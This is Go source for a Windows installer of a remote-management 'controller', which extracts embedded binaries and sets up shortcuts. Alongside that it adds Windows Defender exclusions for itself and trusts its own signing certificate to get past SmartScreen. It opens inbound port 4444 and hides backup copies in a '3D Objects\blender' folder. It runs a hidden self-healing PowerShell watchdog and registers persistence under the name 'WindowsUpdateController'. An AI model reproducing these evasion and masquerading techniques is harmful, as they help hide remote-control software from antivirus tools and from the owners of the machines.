package main

import (
	"bytes"
	"crypto/rand"
	"embed"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

var (
	modShell32       = syscall.NewLazyDLL("shell32.dll")
	procIsUserAdmin  = modShell32.NewProc("IsUserAnAdmin")
	modUser32        = syscall.NewLazyDLL("user32.dll")
	procMessageBoxW  = modUser32.NewProc("MessageBoxW")
)

func isAdmin() bool {
	ret, _, _ := procIsUserAdmin.Call()
	return ret != 0
}

func msgBox(title, text string, flags uintptr) int {
	t, _ := syscall.UTF16PtrFromString(title)
	m, _ := syscall.UTF16PtrFromString(text)
	ret, _, _ := procMessageBoxW.Call(0, uintptr(unsafe.Pointer(m)), uintptr(unsafe.Pointer(t)), flags)
	return int(ret)
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	// pass through args
	args := strings.Join(os.Args[1:], " ")
	params, _ := syscall.UTF16PtrFromString(args)
	var showCmd int32 = 1
	// ShellExecuteW
	modShell32.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)), uintptr(unsafe.Pointer(params)), 0, uintptr(showCmd))
	os.Exit(0)
}

// trustPublisherCert installs our code-signing cert into TrustedPublisher
// so SmartScreen/Smart App Control accept our signed binaries. Needs admin.
func trustPublisherCert(dir string) {
	cer := filepath.Join(dir, "RMM.cer")
	if _, err := os.Stat(cer); err != nil {
		fmt.Println("[!] publisher cert missing, SmartScreen may warn")
		return
	}
	if out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput(); err != nil {
		fmt.Printf("[!] trust publisher cert: %v %s\n", err, strings.TrimSpace(string(out)))
		return
	}
	fmt.Println("[*] Publisher cert trusted")
}

// addDefenderExclusions keeps Defender from quarantining our install dir +
// exe. Best effort: fails silently when Defender is absent, managed, or
// Tamper Protection blocks it.
func addDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func removeDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func doUninstall() {
	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = `C:\Program Files`
	}
	installDir := filepath.Join(programFiles, "RMM", "Controller")
	fmt.Printf("Uninstalling from %s\n", installDir)
	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe", "relay.exe"} {
		_, _ = exec.Command("taskkill", "/F", "/IM", n).CombinedOutput()
	}
	// Kill controller watchdog by command-line match (hidden windows have no title).
	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*controller-watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
	// Remove Run keys
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.DeleteValue("WindowsUpdateController")
		k.Close()
	}
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
	desktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	_ = os.Remove(filepath.Join(desktop, "Controller.lnk"))
	_ = os.Remove(filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\RMM Controller.lnk`))
	_, _ = exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=RMM Controller").CombinedOutput()
	removeDefenderExclusions(installDir, filepath.Join(installDir, "controller-native.exe"))
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`)
	// Clean up backup directory (controller files share blender/ with agent backup;
	// only remove controller-owned files, never the whole dir).
	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	backupDir := filepath.Join(threeDObjects, "blender")
	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.ps1"))
	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log"))
	_ = os.Remove(filepath.Join(backupDir, "controller-watchdog.log.1"))
	_ = os.Remove(filepath.Join(backupDir, "controller-version.txt"))
	for _, bin := range []string{"controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe"} {
		_ = os.Remove(filepath.Join(backupDir, bin))
	}
	_ = os.RemoveAll(installDir)
	fmt.Println("Uninstalled.")
}

func main() {
	for _, a := range os.Args[1:] {
		if a == "--uninstall" || a == "-u" {
			if !isAdmin() {
				relaunchAsAdmin()
				return
			}
			doUninstall()
			return
		}
	}
	fmt.Println("=== RMM Controller Setup ===")
	if !isAdmin() {
		fmt.Println("[*] Requesting administrator privileges...")
		relaunchAsAdmin()
		return
	}
	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = `C:\Program Files`
	}
	installDir := filepath.Join(programFiles, "RMM", "Controller")
	fmt.Printf("[*] Installing to %s\n", installDir)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		msgBox("Error", fmt.Sprintf("Failed to create directory:\n%v", err), 0x10)
		os.Exit(1)
	}
	// Stop any running controllers first, otherwise overwriting the exes
	// fails with "being used by another process".
	fmt.Println("[*] Stopping running controllers...")
	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe"} {
		_, _ = exec.Command("taskkill", "/F", "/IM", n).CombinedOutput()
	}
	time.Sleep(1500 * time.Millisecond)
	// Extract payload
	count := 0
	err := fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel("payload", path)
		dest := filepath.Join(installDir, rel)
		if err := os.MkdirAll(filepath.Dir(dest), 0755); err != nil {
			return err
		}
		data, err := fs.ReadFile(payloadFS, path)
		if err != nil {
			return err
		}
		fmt.Printf("  -> %s (%d bytes)\n", rel, len(data))
		if err := os.WriteFile(dest, data, 0644); err != nil {
			return err
		}
		count++
		return nil
	})
	if err != nil {
		msgBox("Error", fmt.Sprintf("Install failed:\n%v", err), 0x10)
		os.Exit(1)
	}
	fmt.Printf("[*] Extracted %d files\n", count)

	// Create desktop shortcut
	desktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	// Fallback to known folder
	if _, err := os.Stat(desktop); os.IsNotExist(err) {
		desktop = os.Getenv("OneDrive") + `\Desktop`
		if _, err := os.Stat(desktop); os.IsNotExist(err) {
			desktop = filepath.Join(os.Getenv("USERPROFILE"), "OneDrive", "Desktop")
		}
	}
	// Also try via PowerShell known folder
	if _, err := os.Stat(desktop); os.IsNotExist(err) {
		out, _ := exec.Command("powershell", "-NoProfile", "-command", "[Environment]::GetFolderPath('Desktop')").CombinedOutput()
		cand := strings.TrimSpace(string(out))
		if cand != "" {
			desktop = cand
		}
	}
	// Native window first: no browser needed. controller-native.exe is the
	// default launch target; fall back to controller-ui.exe (browser) and
	// finally headless controller.exe.
	target := filepath.Join(installDir, "controller-native.exe")
	if _, err := os.Stat(target); os.IsNotExist(err) {
		target = filepath.Join(installDir, "controller-ui.exe")
	}
	if _, err := os.Stat(target); os.IsNotExist(err) {
		target = filepath.Join(installDir, "controller.exe")
	}
	shortcut := filepath.Join(desktop, "Controller.lnk")
	fmt.Printf("[*] Creating desktop shortcut %s -> %s\n", shortcut, target)
	psScript := fmt.Sprintf(`$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut('%s'); $sc.TargetPath = '%s'; $sc.WorkingDirectory = '%s'; $sc.IconLocation = '%s'; $sc.Description = 'RMM Controller'; $sc.Save()`,
		strings.ReplaceAll(shortcut, "'", "''"),
		strings.ReplaceAll(target, "'", "''"),
		strings.ReplaceAll(installDir, "'", "''"),
		strings.ReplaceAll(target, "'", "''"),
	)
	if out, err := exec.Command("powershell", "-NoProfile", "-command", psScript).CombinedOutput(); err != nil {
		fmt.Printf("[!] Shortcut failed: %v %s\n", err, string(out))
	} else {
		fmt.Println("[*] Desktop shortcut created")
	}
	// Start menu shortcut
	startMenu := filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\RMM Controller.lnk`)
	_ = os.MkdirAll(filepath.Dir(startMenu), 0755)
	psScript2 := fmt.Sprintf(`$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut('%s'); $sc.TargetPath = '%s'; $sc.WorkingDirectory = '%s'; $sc.IconLocation = '%s'; $sc.Save()`,
		strings.ReplaceAll(startMenu, "'", "''"),
		strings.ReplaceAll(target, "'", "''"),
		strings.ReplaceAll(installDir, "'", "''"),
		strings.ReplaceAll(target, "'", "''"),
	)
	_, _ = exec.Command("powershell", "-NoProfile", "-command", psScript2).CombinedOutput()

	// Add firewall rule
	fmt.Println("[*] Adding firewall rule...")
	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "protocol=TCP", "localport=4444").CombinedOutput()
	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "program="+target, "enable=yes").CombinedOutput()

	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
	// ask Defender to leave our dir/exe alone (heuristic false positives).
	trustPublisherCert(installDir)
	addDefenderExclusions(installDir, target)

	// Backup controller binaries to hidden directory for self-healing
	fmt.Println("[*] Creating controller backup for self-healing...")
	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	backupDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(backupDir, 0755)
	for _, bin := range []string{"controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe"} {
		src := filepath.Join(installDir, bin)
		if data, err := os.ReadFile(src); err == nil {
			_ = os.WriteFile(filepath.Join(backupDir, bin), data, 0644)
			fmt.Printf("  -> backed up %s\n", bin)
		} else {
			fmt.Printf("  -> backup skipped (missing): %s\n", bin)
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(backupDir, "controller-version.txt"), []byte(version.Version+"\n"), 0644)

	// Agent registration token: shared secret agents present in hello so
	// rogue agents can't blend into the fleet. Kept across reinstalls.
	tokenPath := filepath.Join(installDir, "agent_token.txt")
	if b, err := os.ReadFile(tokenPath); err != nil || len(bytes.TrimSpace(b)) == 0 {
		var rb [24]byte
		_, _ = rand.Read(rb[:])
		tok := hex.EncodeToString(rb[:])
		_ = os.WriteFile(tokenPath, []byte(tok+"\n"), 0600)
		fmt.Println("[*] Generated agent registration token.")
		fmt.Println("    Distribute it: reinstall agents with Agent-Setup.exe -token <token>,")
		fmt.Println("    or send it fleet-wide with: set-agent-token <token> (send-to-all),")
		fmt.Println("    then enable enforcement in Settings. Token file: " + tokenPath)
	} else {
		fmt.Println("[*] Kept existing agent registration token.")
	}

	// Add/Remove Programs entry
	fmt.Println("[*] Registering uninstall...")
	regPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.WRITE)
	if err == nil {
		k.SetStringValue("DisplayName", "RMM Controller")
		k.SetStringValue("DisplayVersion", version.Version)
		k.SetStringValue("Publisher", "RMM")
		k.SetStringValue("InstallLocation", installDir)
		k.SetStringValue("UninstallString", filepath.Join(installDir, "uninstall.exe"))
		k.SetDWordValue("NoModify", 1)
		k.SetDWordValue("NoRepair", 1)
		k.Close()
	}

	// Create controller watchdog script (same pattern as agent watchdog v2:
	// version guard + file logging + 30s cadence).
	controllerWatchdogPath := filepath.Join(backupDir, "controller-watchdog.ps1")
	controllerWatchdogLog := filepath.Join(backupDir, "controller-watchdog.log")
	controllerWatchdogScript := fmt.Sprintf(`# RMM Controller Watchdog v2 - monitors controller binaries
$backupDir = "%s"
$installDir = "%s"
$watchdogLog = "%s"
function Write-Log([string]$msg) {
    $line = "[$(Get-Date -Format o)] $msg"
    try {
        if ((Test-Path $watchdogLog) -and ((Get-Item $watchdogLog).Length -gt 5MB)) {
            Remove-Item ($watchdogLog + ".1") -ErrorAction SilentlyContinue
            Rename-Item $watchdogLog ((Split-Path $watchdogLog -Leaf) + ".1") -ErrorAction SilentlyContinue
        }
        Add-Content -Path $watchdogLog -Value $line
    } catch {}
    Write-Host $line
}
function Get-Version([string]$f) {
    if (Test-Path $f) { return ((Get-Content $f -TotalCount 1).Trim()) }
    return ""
}
while ($true) {
    Start-Sleep -Seconds 30
    $bins = @("controller-native.exe", "controller.exe", "controller-ui.exe", "relay.exe")
    foreach ($bin in $bins) {
        $instPath = Join-Path $installDir $bin
        $backupPath = Join-Path $backupDir $bin
        if ((Test-Path $backupPath) -and (-not (Test-Path $instPath))) {
            $instVer = Get-Version (Join-Path $installDir "version.txt")
            $bakVer = Get-Version (Join-Path $backupDir "controller-version.txt")
            if ($bakVer -ne "" -and $instVer -ne "" -and ($bakVer -lt $instVer)) {
                Write-Log "Backup $bin v$bakVer older than installed v$instVer - skipping restore"
                continue
            }
            Copy-Item $backupPath $instPath -Force
            Write-Log "Restored $bin from backup"
        }
    }
}
`, backupDir, installDir, controllerWatchdogLog)
	_ = os.WriteFile(controllerWatchdogPath, []byte(controllerWatchdogScript), 0644)

	// Run controller watchdog now (Run key + scheduled task cover reboot).
	cmdWatchdog := exec.Command("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", controllerWatchdogPath)
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	// HKLM Run key for controller watchdog
	controllerWatchdogCmd := fmt.Sprintf(`powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, controllerWatchdogPath)
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateController", controllerWatchdogCmd)
		k.Close()
		fmt.Println("[*] HKLM Run key set for controller watchdog")
	} else {
		fmt.Printf("[!] HKLM controller watchdog Run key failed: %v\n", err)
	}

	// Scheduled-task fallback so the watchdog survives without waiting for
	// the next boot (mirrors the agent WindowsUpdateWatchdog task).
	controllerTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
</Task>`, controllerWatchdogPath)
	tmpControllerTask := filepath.Join(os.TempDir(), "rmm_controller_watchdog_task.xml")
	_ = os.WriteFile(tmpControllerTask, []byte(controllerTaskXML), 0644)
	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateController", "/xml", tmpControllerTask, "/f").CombinedOutput(); err != nil {
		fmt.Printf("[!] Controller watchdog task failed: %v %s\n", err, strings.TrimSpace(string(out)))
	} else {
		fmt.Println("[*] Controller watchdog task registered")
	}
	_ = os.Remove(tmpControllerTask)

	// Create uninstall.exe as copy of self with --uninstall flag (simple)
	uninstallPath := filepath.Join(installDir, "uninstall.exe")
	self, _ := os.Executable()
	if data, err := os.ReadFile(self); err == nil {
		_ = os.WriteFile(uninstallPath, data, 0755)
	}

	fmt.Println("[*] Install complete!")
	msgBox("RMM Controller", "Controller installed to:\n"+installDir+"\n\nDesktop shortcut created.\n\nRun Controller.lnk to start.", 0x40)
}
